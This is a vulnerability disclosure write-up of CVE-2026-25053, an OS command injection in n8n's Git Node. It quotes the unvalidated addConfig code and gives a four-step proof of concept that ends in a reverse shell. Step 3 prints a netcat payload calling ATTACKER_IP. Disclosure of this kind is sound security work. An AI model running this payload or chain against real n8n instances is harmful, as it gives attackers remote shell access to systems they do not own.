---
title: 'n8n: OS Command Injection in Git Node - CVE-2026-25053'
author: Fatih Çelik
date: 2026-02-04 00:00:00 +0300
categories: [Vulnerability Research]
tags: [vulnerability research]
math: true
mermaid: true
---

## TL;DR but not really

Advisory: [CVE-2026-25053](https://github.com/n8n-io/n8n/security/advisories/GHSA-9g95-qf3f-ggrw)

One day, while hunting for vulnerabilities on n8n, the **Git Node** caught my attention, and I started investigating what I could do with it. Naturally, my primary goal was to find a way to achieve RCE.

At first glance, the node appeared harmless. However, after a bit of research, I realized a configuration parameter called `core.sshCommand`. When I looked deeper into n8n code, I realized that the input parameters were being set without any validation checks.

My path was now clear: I would set `core.sshCommand` to the command I intended to execute, and then trigger a `git fetch` operation via SSH. 

## The Flaw

I looked into `packages/nodes-base/nodes/Git/Git.node.ts` to see how n8n handles this `addConfig` operation. And well, it was exactly what I suspected:

```typescript
} else if (operation === 'addConfig') {
    // ...
    const key = this.getNodeParameter('key', itemIndex, '') as string;
    const value = this.getNodeParameter('value', itemIndex, '') as string;
    // ...
    await git.addConfig(key, value, append);  // <-- Direct pass-through
    // ...
}
```

There is absolutely no validation. The `key` and `value` parameters are taken directly from the user input and passed straight to the library. No allow-list, no sanitization, nothing. It’s a straight shot to `git config`.

## The Exploit (PoC)

So, the plan is simple:
1.  **Clone a Repo:** We need a git repo to work on.
2.  **Poison the Config:** We use the vulnerable `addConfig` operation to set `core.sshCommand` to our malicious payload.
3.  **Trigger:** We force Git to use SSH (and thus run our command) by adding a fake remote and trying to fetch from it.

-------

Here is the step-by-step breakdown:

### Step 1: Clone the repository
First, I just cloned a random repository to have a working directory.

- **Operation:** Clone to /tmp/exploit path
- **Repo:** Any public repo (e.g., `https://github.com/fatihhcelik/PathFinder`)

### Step 2: Add a remote URL
Next, I added a remote URL that forces the use of SSH. It doesn't matter if the host is fake, we just need Git to *try* to connect.

- **Operation:** addConfig
- **Key:** `remote.origin.url`
- **Value:** `git@fakehost.com:user/repo.git`

### Step 3: Inject the payload
This is the main exploit step. We set the `core.sshCommand` to our payload.

- **Operation:** addConfig
- **Key:** `core.sshCommand`
- **Value:** `sh -c 'nohup nc ATTACKER_IP 4444 -e sh >/dev/null 2>&1 &'`

### Step 4: Trigger the payload
Finally, I triggered a `fetch` operation. Git saw the SSH URL, looked up `core.sshCommand` to see how to connect, and just like that, it executed my command instead of `ssh`.

- **Operation:** Fetch

**The Result:** A reverse shell.

*The issue has been fixed in n8n versions 2.5.0, and 1.123.10. Users should upgrade to this version or later to remediate the vulnerability.*

![image.png](/photos/n8n-os-command.png)